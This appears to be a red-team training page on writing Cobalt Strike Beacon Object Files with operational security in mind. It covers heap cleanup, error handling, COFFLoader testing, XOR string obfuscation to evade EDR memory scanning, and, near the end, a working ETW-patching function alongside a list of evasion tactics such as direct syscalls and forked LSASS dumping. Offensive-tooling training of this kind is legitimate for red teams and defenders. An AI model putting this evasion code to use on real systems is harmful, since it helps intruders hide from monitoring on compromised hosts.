---
layout: training-page
title: "BOF OPSEC & Memory Cleanup — Red Team Academy"
module: "Tool Development"
tags:
  - bof
  - opsec
  - memory-cleanup
  - edr-evasion
  - artifact-avoidance
  - heap-cleanup
  - coffloader
page_key: "tool-dev-bof-opsec"
render_with_liquid: false
---

# BOF OPSEC & Memory Cleanup

BOFs avoid process creation artifacts but introduce other detection vectors: memory allocation patterns, API call sequences, heap artifacts, and string remnants. A poorly written BOF that crashes, leaks memory, or leaves detectable strings in the Beacon process heap is worse than not using a BOF at all. This page covers OPSEC considerations, proper memory cleanup, error handling, and testing BOFs safely outside of live Beacon sessions.

---

## Memory Cleanup in BOFs

BOFs execute within the Beacon process. All allocations must be explicitly freed. Unlike traditional executables, there is no process exit to clean up leaked resources — leaked memory accumulates across BOF executions and may grow until Beacon crashes or is killed.

### The Cleanup Contract

```c
// The fundamental BOF lifecycle:
// 1. Beacon allocates BOF sections (loader does this)
// 2. go() is called with args
// 3. go() must free ALL resources before returning
// 4. Beacon frees the BOF sections (loader does this)

// WRONG — resource leak
void go(char *args, int args_len) {
    HANDLE heap = KERNEL32$GetProcessHeap();
    char *buf = (char *)KERNEL32$HeapAlloc(heap, HEAP_ZERO_MEMORY, 4096);
    
    do_work(buf);
    
    // ERROR: forgot to free buf! 
    // If this BOF is called 100 times, 400KB leaked from Beacon heap
    return;
}

// CORRECT — always free
void go(char *args, int args_len) {
    HANDLE heap = KERNEL32$GetProcessHeap();
    char *buf = NULL;
    
    buf = (char *)KERNEL32$HeapAlloc(heap, HEAP_ZERO_MEMORY, 4096);
    if (!buf) {
        BeaconPrintf(CALLBACK_ERROR, "Allocation failed\n");
        return;
    }
    
    do_work(buf);
    
cleanup:
    if (buf) KERNEL32$HeapFree(heap, 0, buf);
    return;
}
```

### goto-cleanup Pattern

For BOFs with multiple allocations, use goto-based cleanup to ensure all resources are freed:

```c
void go(char *args, int args_len) {
    HANDLE heap  = KERNEL32$GetProcessHeap();
    HANDLE hProc = INVALID_HANDLE_VALUE;
    HANDLE hToken = NULL;
    char *buf1   = NULL;
    char *buf2   = NULL;
    
    // Allocate resources
    buf1 = (char *)KERNEL32$HeapAlloc(heap, HEAP_ZERO_MEMORY, 1024);
    if (!buf1) { BeaconPrintf(CALLBACK_ERROR, "buf1 alloc failed\n"); goto cleanup; }
    
    buf2 = (char *)KERNEL32$HeapAlloc(heap, HEAP_ZERO_MEMORY, 2048);
    if (!buf2) { BeaconPrintf(CALLBACK_ERROR, "buf2 alloc failed\n"); goto cleanup; }
    
    hProc = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, 1234);
    if (!hProc) { BeaconPrintf(CALLBACK_ERROR, "OpenProcess failed\n"); goto cleanup; }
    
    if (!ADVAPI32$OpenProcessToken(hProc, TOKEN_QUERY, &hToken)) {
        BeaconPrintf(CALLBACK_ERROR, "OpenProcessToken failed\n");
        goto cleanup;
    }
    
    // Main work here
    do_work_with_token(hToken, buf1, buf2);
    
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Operation complete\n");
    
cleanup:
    // Cleanup in reverse order of allocation
    if (hToken  && hToken  != INVALID_HANDLE_VALUE) KERNEL32$CloseHandle(hToken);
    if (hProc   && hProc   != INVALID_HANDLE_VALUE) KERNEL32$CloseHandle(hProc);
    if (buf2)   KERNEL32$HeapFree(heap, 0, buf2);
    if (buf1)   KERNEL32$HeapFree(heap, 0, buf1);
}
```

---

## Heap Artifact Avoidance

After a BOF runs, the heap it used is still part of the Beacon process. EDR memory scanning can find residual data:

### Zeroing Sensitive Buffers Before Free

```c
// After using a buffer that contains sensitive data (credentials, keys, hashes),
// always zero the buffer before freeing

DECLSPEC_IMPORT PVOID WINAPI KERNEL32$SecureZeroMemory(PVOID, SIZE_T);

void handle_credential(char *cred_buf, DWORD cred_len) {
    // ... do work with credential ...
    
    // Zero before free (SecureZeroMemory cannot be optimized away by compiler)
    KERNEL32$SecureZeroMemory(cred_buf, cred_len);
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, cred_buf);
    cred_buf = NULL;
}

// Alternatively, use RtlSecureZeroMemory (ntdll):
DECLSPEC_IMPORT VOID WINAPI NTDLL$RtlSecureZeroMemory(PVOID, SIZE_T);
```

### Using BeaconDataAlloc

For BOF output buffers, use Beacon's memory management instead of HeapAlloc:

```c
// BeaconDataAlloc allocates memory in Beacon's own output buffer system
// Automatically managed — less risk of leak

formatp output;
BeaconFormatAlloc(&output, 4096);

// Write output into format buffer
BeaconFormatPrintf(&output, "Found: %d items\n", count);
BeaconFormatPrintf(&output, "Target: %s\n", target_name);

// Send and free — Beacon handles cleanup
BeaconOutputF(CALLBACK_OUTPUT, &output);

// Manual free of format buffer
BeaconFormatFree(&output);
```

### String Handling: Avoid Cleartext in Heap

```c
// BAD: sensitive string left in heap after BOF
void bad_example(char *args, int args_len) {
    // Password string allocated on heap
    char *password = KERNEL32$HeapAlloc(heap, 0, 64);
    MSVCRT$strcpy(password, "SuperSecretP@ssw0rd");
    
    authenticate(password);
    
    KERNEL32$HeapFree(heap, 0, password);
    // Heap chunk contains "SuperSecretP@ssw0rd" until overwritten by next allocation
}

// GOOD: zero sensitive strings before free
void good_example(char *args, int args_len) {
    HANDLE heap = KERNEL32$GetProcessHeap();
    char *password = (char *)KERNEL32$HeapAlloc(heap, HEAP_ZERO_MEMORY, 64);
    MSVCRT$strcpy(password, "SuperSecretP@ssw0rd");
    
    authenticate(password);
    
    // Zero first, then free
    KERNEL32$SecureZeroMemory(password, 64);
    KERNEL32$HeapFree(heap, 0, password);
}
```

---

## Error Handling: Return Codes vs Crash

A crashing BOF crashes the entire Beacon. This terminates the implant, generates a crash artifact, and may alert the defender. Every Windows API call should be checked.

### Defense-in-Depth Error Checking

```c
// Pattern: check every API call, report error, goto cleanup
HANDLE hProcess = KERNEL32$OpenProcess(PROCESS_VM_READ, FALSE, target_pid);
if (!hProcess || hProcess == INVALID_HANDLE_VALUE) {
    // Report error (don't just fail silently — operator needs to know)
    BeaconPrintf(CALLBACK_ERROR, 
        "[-] OpenProcess(PID=%d) failed: error=%d\n",
        target_pid, KERNEL32$GetLastError());
    // Specific error interpretation:
    switch (KERNEL32$GetLastError()) {
        case ERROR_ACCESS_DENIED:   BeaconPrintf(CALLBACK_ERROR, "    (Access Denied — need higher privileges)\n"); break;
        case ERROR_INVALID_PARAMETER: BeaconPrintf(CALLBACK_ERROR, "    (Invalid PID)\n"); break;
        case ERROR_NOT_FOUND:       BeaconPrintf(CALLBACK_ERROR, "    (Process not found — may have exited)\n"); break;
    }
    goto cleanup;
}
```

### Stack vs Heap Allocation Trade-offs

```c
// Stack allocation: safer (automatic cleanup), limited size, survives goto
// Use for: small fixed-size buffers, flag arrays, struct workspace

char path_buf[MAX_PATH];               // 260 bytes — fine for stack
BOOL found_targets[32] = {FALSE};      // Small boolean array

// Heap allocation: required for large/dynamic buffers
// Use for: enumeration results, network data, file content

DWORD needed_size = 0;
NETAPI32$NetShareEnum(NULL, 1, &share_buf, MAX_PREFERRED_LENGTH, 
                      &entries_read, &total, &resume);
// share_buf is heap-allocated by NetAPI — MUST be freed with NetApiBufferFree
```

### NULL Pointer Checks

```c
// All pointer arguments received from BeaconDataExtract must be validated
datap parser;
BeaconDataParse(&parser, args, args_len);
char *target = BeaconDataExtract(&parser, NULL);

// BAD: using target without checking
MSVCRT$strlen(target);  // Crash if args was empty

// GOOD: validate before use
if (!target || !target[0]) {
    BeaconPrintf(CALLBACK_ERROR, "[-] Usage: bof_name <target_host>\n");
    return;
}
```

---

## Artifact Detection: What EDRs Find in BOF Remnants

EDR memory scanners look for specific patterns in process memory:

### Detectable Artifacts

| Artifact Type | Example | Risk Level |
|--------------|---------|-----------|
| Embedded strings | "SeDebugPrivilege" in heap | Medium |
| API name strings | "OpenProcess\0MiniDumpWriteDump" | Medium |
| COFF magic bytes | COFF header `0x4C01` still in heap | Medium |
| Credential strings | NTLM hash in cleartext in heap | High |
| Network indicators | IP:port strings after scan | Low-Medium |

### Reducing String Artifacts

```c
// Avoid having API name strings visible in the compiled BOF
// Use string obfuscation for sensitive strings

// Simple XOR obfuscation for API names
// At compile time, store XOR'd strings
// At runtime, XOR-decode before use

#define XORKEY 0x42

static char s_debug_priv[] = {
    'S'^XORKEY, 'e'^XORKEY, 'D'^XORKEY, 'e'^XORKEY, 'b'^XORKEY,
    'u'^XORKEY, 'g'^XORKEY, 'P'^XORKEY, 'r'^XORKEY, 'i'^XORKEY,
    'v'^XORKEY, 'i'^XORKEY, 'l'^XORKEY, 'e'^XORKEY, 'g'^XORKEY,
    'e'^XORKEY, '\0'^XORKEY
};

void decode_string(char *str, size_t len) {
    for (size_t i = 0; i < len; i++) {
        str[i] ^= XORKEY;
    }
}

void go(char *args, int args_len) {
    // Decode on stack (not heap — automatically cleaned up)
    char debug_priv[17];
    MSVCRT$memcpy(debug_priv, s_debug_priv, 17);
    decode_string(debug_priv, 16);  // "SeDebugPrivilege" now in local var
    
    // Use
    ADVAPI32$LookupPrivilegeValueA(NULL, debug_priv, &luid);
    
    // Zero after use (stack variable, but good practice)
    MSVCRT$memset(debug_priv, 0, sizeof(debug_priv));
}
```

### Avoiding COFF Header Artifacts

After COFFLoader loads and relocates a BOF, the COFF header structure may remain in memory. Some EDRs specifically scan for COFF magic bytes (`0x014C` for x86, `0x8664` for x64) in non-standard locations:

```c
// Defensive BOF loading pattern (COFFLoader side — for custom loaders):
// After executing the BOF's go() function:
// 1. Zero the BOF sections in memory
// 2. Then VirtualFree the section memory

// For built BOFs: ensure no embedded .bss global that retains COFF signature
// Use stack-allocated alternatives to global variables
```

---

## BeaconCleanupProcess Teardown

When Beacon exits (controlled exit via `exit` command), it cleans up resources. Ensure BOFs don't prevent clean shutdown:

```c
// Avoid:
// - Global variables holding HANDLEs (not cleaned up on BOF return)
// - Static variables accumulating state across BOF calls
// - Named objects (mutexes, events) that outlive the BOF

// Globals are not per-BOF — they're per process:
static HANDLE g_persistent_handle = NULL;  // DANGER: persists across BOF calls

// Better: open and close handle within go():
void go(char *args, int args_len) {
    HANDLE local_handle = open_something();
    // ... use it ...
    KERNEL32$CloseHandle(local_handle);
    // local_handle is gone when go() returns
}
```

---

## Avoiding Common BOF Mistakes

### Null Terminator Mistakes

```c
// WRONG: off-by-one in string allocation
char *target = (char *)KERNEL32$HeapAlloc(heap, 0, MSVCRT$strlen(input));
MSVCRT$strcpy(target, input);  // Overflow! No room for null terminator

// CORRECT: allocate strlen + 1 for null terminator
char *target = (char *)KERNEL32$HeapAlloc(heap, HEAP_ZERO_MEMORY, MSVCRT$strlen(input) + 1);
MSVCRT$strncpy(target, input, MSVCRT$strlen(input));
```

### Buffer Size Validation

```c
// WRONG: trust size argument from args
int buf_size = BeaconDataInt(&parser);
char *buf = KERNEL32$HeapAlloc(heap, 0, buf_size);
// If buf_size is 0: HeapAlloc may return a valid handle but writing to it is UB
// If buf_size is MAX_INT: HeapAlloc fails, buf is NULL, then crashes on use

// CORRECT: validate range
int buf_size = BeaconDataInt(&parser);
if (buf_size <= 0 || buf_size > 10 * 1024 * 1024) {  // Sanity: 1B to 10MB
    BeaconPrintf(CALLBACK_ERROR, "Invalid buffer size: %d\n", buf_size);
    return;
}
char *buf = (char *)KERNEL32$HeapAlloc(heap, HEAP_ZERO_MEMORY, buf_size);
if (!buf) {
    BeaconPrintf(CALLBACK_ERROR, "HeapAlloc(%d) failed\n", buf_size);
    return;
}
```

### API Return Code Check

```c
// WRONG: ignore GetLastError
ADVAPI32$RegSetValueExA(hKey, "UseLogonCredential", 0, REG_DWORD, &val, sizeof(DWORD));
BeaconPrintf(CALLBACK_OUTPUT, "[+] Registry set\n");  // May have failed!

// CORRECT: always check return value
LONG ret = ADVAPI32$RegSetValueExA(hKey, "UseLogonCredential", 0, REG_DWORD, &val, sizeof(DWORD));
if (ret == ERROR_SUCCESS) {
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Registry key set successfully\n");
} else {
    BeaconPrintf(CALLBACK_ERROR, "[-] RegSetValueEx failed: %d\n", ret);
}
```

---

## Testing BOFs Safely: COFFLoader

Never develop BOFs by running them in a live Beacon. Use TrustedSec's COFFLoader to test BOFs standalone:

### COFFLoader Setup

```bash
# Download COFFLoader
git clone https://github.com/trustedsec/COFFLoader.git
cd COFFLoader
make  # Builds COFFLoader executable

# Usage
./COFFLoader64 bof_name.x64.o go args...
./COFFLoader64 netstat_bof.x64.o go
./COFFLoader64 ipconfig_bof.x64.o go

# With packed arguments (matching Aggressor bof_pack format):
# COFFLoader accepts pre-packed binary argument blobs
./COFFLoader64 make_token.x64.o go packed_args.bin
```

### Argument Pack Testing

```python
#!/usr/bin/env python3
# pack_args.py — create binary arg pack for COFFLoader testing
import struct

def pack_string(s):
    """Pack null-terminated string with 4-byte length prefix"""
    encoded = s.encode('utf-8') + b'\x00'
    return struct.pack('<I', len(encoded)) + encoded

def pack_int(n):
    """Pack 4-byte integer"""
    return struct.pack('<I', n)

def pack_short(n):
    """Pack 2-byte short"""
    return struct.pack('<H', n)

# Pack args for make_token.c (domain, username, password)
args = b""
args += pack_string("CORP")
args += pack_string("jdoe")
args += pack_string("Password123!")

with open("make_token_args.bin", "wb") as f:
    f.write(args)

print(f"Args packed: {len(args)} bytes → make_token_args.bin")
print("Run: ./COFFLoader64 make_token.x64.o go < make_token_args.bin")
```

### Development Iteration Cycle

```bash
# Safe BOF development cycle — never touch live Beacon until verified
1. Edit BOF C source
2. Compile (mingw-w64 or cl.exe)
3. Test with COFFLoader in isolation
4. Fix crashes/leaks identified by COFFLoader
5. Repeat until stable
6. Only then: load into Beacon via inline-execute

# Detect crashes in COFFLoader:
./COFFLoader64 my_bof.x64.o go
echo "Exit code: $?"
# Non-zero = crash = fix before using in Beacon

# Valgrind on COFFLoader for leak detection (Linux):
valgrind --leak-check=full ./COFFLoader64 my_bof.x64.o go
```

---

## Memory OPSEC: What EDRs Scan For

Modern EDRs scan process memory looking for offensive tool signatures. In Beacon (and BOF residue):

### Common Memory Signatures

```
Detectable patterns in process memory:
1. Cobalt Strike beacon config (XOR'd with 0x69 or 0x2E)
   → Signature databases have both XOR keys
2. BOF section headers (COFF magic bytes at unexpected offsets)
3. Mimikatz/sekurlsa strings (even embedded in BOF)
4. LSASS handle open from Beacon process (not via spawned process)
5. Heap allocations containing NT hashes or Kerberos ticket data

Mitigation approaches:
- Use encrypted strings (XOR, RC4) for tool-identifying strings
- Zero sensitive buffers after use (SecureZeroMemory)
- Use direct syscalls to avoid hook-based detection
- Limit time between LSASS dump and credential extraction
- Use forked processes for LSASS interaction (nanodump --fork)
```

### AMSI and ETW Bypass in BOFs

```c
// ETW (Event Tracing for Windows) bypass via patch in BOF:
// NtTraceEvent in ntdll.dll — patch to return immediately

DECLSPEC_IMPORT PVOID WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);

void patch_etw(void) {
    HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    PVOID pEtwFunc = KERNEL32$GetProcAddress(hNtdll, "EtwEventWrite");
    
    DWORD old_prot;
    KERNEL32$VirtualProtect(pEtwFunc, 1, PAGE_EXECUTE_READWRITE, &old_prot);
    
    // Patch with RET instruction (0xC3)
    *(BYTE *)pEtwFunc = 0xC3;
    
    KERNEL32$VirtualProtect(pEtwFunc, 1, old_prot, &old_prot);
    
    BeaconPrintf(CALLBACK_OUTPUT, "[*] ETW patched in Beacon process\n");
}
// WARNING: ETW patching itself may be detected — evaluate tradeoff
```
